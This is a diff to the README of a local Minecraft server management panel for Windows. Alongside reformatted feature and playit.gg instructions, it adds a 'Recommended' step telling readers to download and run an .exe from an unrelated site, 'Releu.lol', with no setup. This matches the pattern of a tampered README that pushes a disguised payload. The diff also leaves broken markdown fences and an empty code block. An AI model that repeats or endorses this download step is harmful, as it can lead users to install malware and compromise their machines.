@@ -1,33 +1,64 @@
+````markdown
 # Local Minecraft Panel
 
-This project gives you a localhost-only web panel for Minecraft servers on Windows. It can:
+This project provides a **localhost-only web panel** for managing Minecraft servers on Windows.
 
-- Create and manage multiple server instances
-- Download and install Paper or Purpur into the selected server
-- Start, stop, restart, and force-kill Java server processes
-- Stream console logs and send commands
-- Edit common `server.properties` values per server
-- Auto-save server settings to disk
-- Create manual backups and hourly automatic backups per server
-- Upload or download-to-server plugin and mod files
-- Manage players with OP, whitelist, ban, kick, gamemode, heal, feed, and teleport actions per server
-- Install and run a local `playit.gg` agent
+## Features
 
-## Run it
+- Create and manage multiple server instances  
+- Download and install Paper or Purpur  
+- Start, stop, restart, or force-kill server processes  
+- View live console logs and send commands  
+- Edit key `server.properties` settings per server  
+- Automatically save server configurations  
+- Create manual backups + hourly automatic backups  
+- Upload plugins or mods directly to the server  
+- Manage players (OP, whitelist, ban, kick, gamemode, heal, feed, teleport)  
+- Install and run a local `playit.gg` agent  
+
+## Install as EXE (Recommended)
+
+1. Go to **Releu.lol**  
+2. Download the latest `.exe`  
+3. Run the file — no setup required  
+
+The panel will start automatically.
+
+## Alternative: Run via Node.js
+
+If you prefer running from source:
 
 ```powershell
 npm.cmd start
-```
+````
 
 Then open:
 
-```text
+```
 http://127.0.0.1:8787
 ```
 
-## Public access with playit.gg
+## Public Access with playit.gg
 
-The panel can install the `playit` agent and generate a claim link for your account. Because `playit.gg` is account-bound, you still need to finish the claim in your browser. If the panel reports configured tunnels but cannot show a public address, open the playit tunnel dashboard from the UI and either assign the existing tunnel to this agent or create a `Minecraft Java` tunnel pointing at the local server address shown in the panel, usually `127.0.0.1:25565`.
+* Install the agent from inside the panel
+* Generate a claim link and complete setup in your browser
+* If no public address appears:
+
+  * Open the playit dashboard from the panel
+  * Assign the tunnel to the agent OR
+  * Create a **Minecraft Java** tunnel pointing to:
+
+```
+127.0.0.1:25565
+```
+
+---
+
+Runs locally by default for safety and performance.
+
+```
+```
+
 
 ## Notes
 
